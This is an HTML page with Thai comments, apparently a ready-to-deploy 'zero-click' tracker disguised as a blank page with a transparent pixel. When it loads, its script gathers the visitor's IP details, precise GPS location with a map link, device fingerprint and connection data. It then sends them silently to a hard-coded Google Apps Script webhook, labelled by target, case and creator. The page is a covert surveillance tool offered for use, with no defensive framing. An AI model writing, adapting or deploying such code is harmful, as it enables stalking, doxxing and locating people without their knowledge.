<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Content</title>
    <style>
        body {
            padding: 0;
            margin: 0;
            height: 0;
            width: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <script>
        // ฟังก์ชันรับพารามิเตอร์จาก URL
        function getUrlParams() {
            const params = {};
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            
            // ดึงค่าพารามิเตอร์ทั้งหมด
            for (const [key, value] of urlParams.entries()) {
                params[key] = value;
            }
            
            return params;
        }

        // ฟังก์ชันดึงข้อมูลที่พิกัดของผู้ใช้
        async function getLocationInfo() {
            try {
                if (navigator.geolocation) {
                    return new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                resolve({
                                    lat: position.coords.latitude,
                                    long: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                                });
                            },
                            error => {
                                console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
                                resolve("ไม่มีข้อมูล");
                            },
                            {
                                timeout: 3000,
                                enableHighAccuracy: true
                            }
                        );
                    });
                }
                return "ไม่มีข้อมูล";
            } catch (error) {
                console.error("Error getting location:", error);
                return "ไม่มีข้อมูล";
            }
        }

        // ฟังก์ชันดึงข้อมูล IP ของผู้ใช้
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                return await response.json();
            } catch (error) {
                console.error("Error getting IP info:", error);
                return { ip: "ไม่สามารถระบุได้" };
            }
        }

        // ฟังก์ชันดึงข้อมูลการเชื่อมต่อ
        function getConnectionInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            if (!connection) {
                return {
                    type: "unknown",
                    effectiveType: "unknown",
                    downlink: null,
                    rtt: null
                };
            }
            
            return {
                type: connection.type || "unknown",
                effectiveType: connection.effectiveType || "unknown",
                downlink: connection.downlink || null,
                rtt: connection.rtt || null,
                saveData: connection.saveData || false
            };
        }

        // ฟังก์ชันดึงข้อมูลอุปกรณ์
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                devicePixelRatio: window.devicePixelRatio,
                colorDepth: window.screen.colorDepth,
                orientation: screen.orientation ? screen.orientation.type : 'unknown'
            };
        }

        // ฟังก์ชันส่งข้อมูลไปยัง webhook
        async function sendDataToWebhook(data) {
            try {
                const params = getUrlParams();
                const webhookUrl = params.webhook || 'https://script.google.com/macros/s/AKfycbzT5jUUwLvrww_AFQoJudKtkg3JdaxZ5Vq090T1C4f3i8dzIoilIVnRCZGRFtomA7Ke/exec';
                
                // กำหนด requestId เพื่อป้องกันการส่งซ้ำ
                data.requestId = "zeroclick-" + Date.now() + "-" + Math.random().toString(36).substring(2, 10);
                
                // ตรวจสอบว่าเคยส่งข้อมูลนี้ไปแล้วหรือไม่
                if (localStorage.getItem(`sent_${data.trackingKey}`)) {
                    console.log("ข้อมูลนี้เคยส่งไปแล้ว");
                    return;
                }
                
                console.log("Sending data to webhook:", data);
                
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data),
                    mode: 'no-cors'
                });
                
                console.log("Data sent successfully");
                
                // บันทึกว่าส่งข้อมูลนี้ไปแล้ว
                localStorage.setItem(`sent_${data.trackingKey}`, "true");
                
            } catch (error) {
                console.error("Error sending data:", error);
            }
        }

        // ฟังก์ชันหลักที่ทำงานเมื่อโหลดหน้านี้
        async function main() {
            try {
                // ดึงพารามิเตอร์จาก URL
                const params = getUrlParams();
                
                // ตรวจสอบว่ามี tracking key หรือไม่
                if (!params.key) {
                    console.error("Missing tracking key");
                    return;
                }
                
                // รวบรวมข้อมูล
                const timestamp = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
                const ipInfo = await getIPInfo();
                const locationInfo = await getLocationInfo();
                const deviceInfo = getDeviceInfo();
                const connectionInfo = getConnectionInfo();
                
                // สร้างข้อมูลสำหรับส่ง
                const dataToSend = {
                    timestamp: timestamp,
                    trackingKey: params.key,
                    caseName: params.case || "ไม่มีค่า",
                    creatorId: params.creator || "",
                    creatorName: params.name || "",
                    
                    // ข้อมูล IP ละเอียด
                    ip: ipInfo,
                    
                    // ข้อมูลพิกัด
                    location: locationInfo,
                    
                    // ข้อมูลอุปกรณ์
                    deviceInfo: {
                        ...deviceInfo,
                        connection: connectionInfo,
                        screenSize: `${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`
                    },
                    
                    // ระบุว่าเป็น zero click จากเป้าหมาย
                    zeroClick: true,
                    isTarget: true,
                    source: "ZeroClickHTML"
                };
                
                // ส่งข้อมูลไปยัง webhook
                await sendDataToWebhook(dataToSend);
            } catch (error) {
                console.error("Error in main function:", error);
            }
        }

        // รันฟังก์ชันหลัก
        main();
    </script>
    <!-- ใส่รูปภาพโปร่งใสขนาด 1x1 pixel -->
    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="" width="1" height="1">
</body>
</html>
